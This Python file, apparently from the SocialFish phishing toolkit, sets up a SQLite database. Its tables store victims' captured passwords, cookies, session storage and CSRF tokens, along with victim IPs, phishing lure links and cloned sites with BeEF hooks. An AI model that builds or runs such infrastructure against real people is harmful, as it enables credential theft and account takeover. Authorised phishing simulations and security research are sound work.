import os
import sqlite3
from core.genToken import genToken

def initDB(DATABASE):
    if not os.path.exists(DATABASE):
        conn = sqlite3.connect(DATABASE)
        cur = conn.cursor()
        create_table_sql = """ CREATE TABLE IF NOT EXISTS creds (
                                            id integer PRIMARY KEY,
                                            url text NOT NULL,
                                            jdoc text,
                                            pdate numeric,
                                            browser text,
                                            bversion text,
                                            platform text,
                                            rip text,
                                            email text,
                                            username text,
                                            password text,
                                            cookies text,
                                            session_storage text,
                                            local_storage text,
                                            csrf_tokens text,
                                            form_fields text,
                                            captured_metadata text,
                                            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                                        ); """
        cur.execute(create_table_sql)
        conn.commit()
        create_table_sql2 = """ CREATE TABLE IF NOT EXISTS socialfish (
                                            id integer PRIMARY KEY,
                                            clicks integer,
                                            attacks integer,
                                            token text
                                        ); """
        cur.execute(create_table_sql2)
        conn.commit()
        sql = ''' INSERT INTO socialfish(id,clicks,attacks,token)
                  VALUES(?,?,?,?) '''
        i = 1
        c = 0
        a = 0
        t = genToken()
        data = (i, c, a, t)
        cur.execute(sql,data)
        conn.commit()
        create_table_sql3 = """ CREATE TABLE IF NOT EXISTS sfmail (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            smtp text,
                                            port text
                                        ); """
        cur.execute(create_table_sql3)
        conn.commit()
        sql = ''' INSERT INTO sfmail(id,email,smtp,port)
                  VALUES(?,?,?,?) '''
        i = 1
        e = ""
        s = ""
        p = ""
        data = (i, e, s, p)
        cur.execute(sql,data)
        conn.commit()
        create_table_sql4 = """ CREATE TABLE IF NOT EXISTS professionals (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            name text,
                                            obs text
                                        ); """
        cur.execute(create_table_sql4)
        conn.commit()
        create_table_sql5 = """ CREATE TABLE IF NOT EXISTS companies (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            name text,
                                            phone text,
                                            address text,
                                            site text
                                        ); """
        cur.execute(create_table_sql5)
        conn.commit()
        # Configuration table for runtime settings (used by SocialFish)
        create_table_sql6 = """ CREATE TABLE IF NOT EXISTS config (
                                            id integer PRIMARY KEY,
                                            url text,
                                            red text,
                                            status text,
                                            beef text
                                        ); """
        cur.execute(create_table_sql6)
        conn.commit()
        # Insert default config row if not present
        cur.execute("SELECT COUNT(*) FROM config")
        if cur.fetchone()[0] == 0:
            # Use localhost defaults instead of GitHub URLs
            cur.execute('INSERT INTO config(id, url, red, status, beef) VALUES(?, ?, ?, ?, ?)',
                        (1, 'http://localhost:5000/custom', 'http://localhost:5000', 'custom', 'no'))
            conn.commit()
        
        # Sessions table for storing victim session data from captures
        create_table_sql7 = """ CREATE TABLE IF NOT EXISTS sessions (
                                            id integer PRIMARY KEY,
                                            session_id text UNIQUE,
                                            lure_hash text,
                                            template_id text,
                                            victim_ip text NOT NULL,
                                            victim_ua text,
                                            url text,
                                            status text DEFAULT 'active',
                                            forms_detected integer DEFAULT 0,
                                            auth_type text,
                                            all_cookies text,
                                            localStorage text,
                                            sessionStorage text,
                                            csrf_tokens text,
                                            form_data text,
                                            submitted_credentials text,
                                            submission_detected integer DEFAULT 0,
                                            submission_url text,
                                            submission_timestamp DATETIME,
                                            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                                            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
                                        ); """
        cur.execute(create_table_sql7)
        conn.commit()
        
        # Lure URLs table for tracking generated phishing links
        create_table_lure_urls = """ CREATE TABLE IF NOT EXISTS lure_urls (
                                            id integer PRIMARY KEY,
                                            template_id integer NOT NULL,
                                            lure_hash text UNIQUE NOT NULL,
                                            full_url text NOT NULL,
                                            target_url text,
                                            click_count integer DEFAULT 0,
                                            first_click DATETIME,
                                            last_click DATETIME,
                                            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
                                        ); """
        cur.execute(create_table_lure_urls)
        conn.commit()
        
        # Clones tracking table for managing saved website clones
        create_table_sql8 = """ CREATE TABLE IF NOT EXISTS clones (
                                            id integer PRIMARY KEY,
                                            clone_hash text UNIQUE,
                                            original_url text NOT NULL,
                                            agent_hash text,
                                            url_hash text,
                                            clone_path text,
                                            clone_size integer DEFAULT 0,
                                            beef_enabled text DEFAULT 'no',
                                            forms_count integer DEFAULT 0,
                                            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                                            last_accessed DATETIME,
                                            access_count integer DEFAULT 0,
                                            status text DEFAULT 'active'
                                        ); """
        cur.execute(create_table_sql8)
        conn.commit()
        
        # Form submissions table for tracking captured forms
        create_table_sql9 = """ CREATE TABLE IF NOT EXISTS form_submissions (
                                            id integer PRIMARY KEY,
                                            session_id text,
                                            clone_id integer,
                                            form_data text,
                                            form_action text,
                                            method text DEFAULT 'POST',
                                            victim_ip text,
                                            victim_ua text,
                                            submission_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                                            FOREIGN KEY(clone_id) REFERENCES clones(id)
                                        ); """
        cur.execute(create_table_sql9)
        conn.commit()
        
        # Templates table for storing saved clone configurations
        create_table_sql10 = """ CREATE TABLE IF NOT EXISTS templates (
                                            id integer PRIMARY KEY,
                                            name text NOT NULL,
                                            base_url text,
                                            description text,
                                            tags text,
                                            url text,
                                            status text DEFAULT 'clone',
                                            beef text DEFAULT 'no',
                                            webhook text,
                                            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                                            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
                                        ); """
        cur.execute(create_table_sql10)
        conn.commit()
        
        conn.close()
